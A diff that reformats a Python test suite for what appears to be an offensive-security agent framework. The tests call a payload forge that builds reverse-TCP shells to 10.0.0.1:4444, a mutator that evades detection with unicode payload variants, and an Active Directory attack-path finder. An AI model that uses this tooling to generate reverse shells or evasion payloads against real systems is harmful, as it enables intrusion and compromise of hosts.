@@ -42,6 +42,7 @@ def test_payload_precondition_enforcement() -> None:
 
     try:
         from core.agent.state import reset_state
+
         state = reset_state("precondition_test")
         can_exec, reason = check_payload_preconditions(state)
         assert not can_exec, "Payload should be forbidden without foothold"
@@ -72,8 +73,7 @@ def test_exploit_mutation_produces_unicode() -> None:
     mutations = AIEvasion.mutate_payload(payload, strategy="semantic")
     assert len(mutations) > 0
     # At least one mutation should contain fullwidth characters
-    assert any(ord(c) > 127 for m in mutations for c in m), \
-        "No unicode mutations produced"
+    assert any(ord(c) > 127 for m in mutations for c in m), "No unicode mutations produced"
 
 
 def test_weapon_foundry_encryption_roundtrip() -> None:
@@ -125,11 +125,16 @@ def test_attack_path_bfs_finds_multihop() -> None:
         "pivot": NetworkHost(ip="10.0.0.2", ports=[22, 445]),
         "target": NetworkHost(ip="10.0.0.3", ports=[445, 3389]),
     }
-    creds = [Credential(
-        username="admin", domain="CORP",
-        credential_type=CredentialType.PASSWORD,
-        value="pass", source="env", admin_level=True,
-    )]
+    creds = [
+        Credential(
+            username="admin",
+            domain="CORP",
+            credential_type=CredentialType.PASSWORD,
+            value="pass",
+            source="env",
+            admin_level=True,
+        )
+    ]
 
     analyzer = ADAnalyzer()
     path = analyzer.calculate_attack_path("attacker", "target", creds, hosts)
@@ -208,14 +213,20 @@ def test_weapon_foundry_raw_and_c_formats() -> None:
     foundry = WeaponFoundry()
 
     raw = foundry.forge(
-        shell_type=ShellType.REVERSE_TCP, lhost="10.0.0.1", lport=4444,
-        encryption=EncryptionMethod.NONE, output_format=PayloadFormat.RAW,
+        shell_type=ShellType.REVERSE_TCP,
+        lhost="10.0.0.1",
+        lport=4444,
+        encryption=EncryptionMethod.NONE,
+        output_format=PayloadFormat.RAW,
     )
     assert len(raw.payload) > 0, "RAW format should produce payload bytes"
 
     c_payload = foundry.forge(
-        shell_type=ShellType.REVERSE_TCP, lhost="10.0.0.1", lport=4444,
-        encryption=EncryptionMethod.NONE, output_format=PayloadFormat.C,
+        shell_type=ShellType.REVERSE_TCP,
+        lhost="10.0.0.1",
+        lport=4444,
+        encryption=EncryptionMethod.NONE,
+        output_format=PayloadFormat.C,
     )
     payload_text = c_payload.payload.decode("utf-8", errors="replace")
     assert "VirtualAlloc" in payload_text, "C format should contain VirtualAlloc"
@@ -273,4 +284,5 @@ def test_tool_registry_post_exploit_uses_real_class() -> None:
 
 if __name__ == "__main__":
     import pytest
+
     sys.exit(pytest.main([__file__, "-v"]))
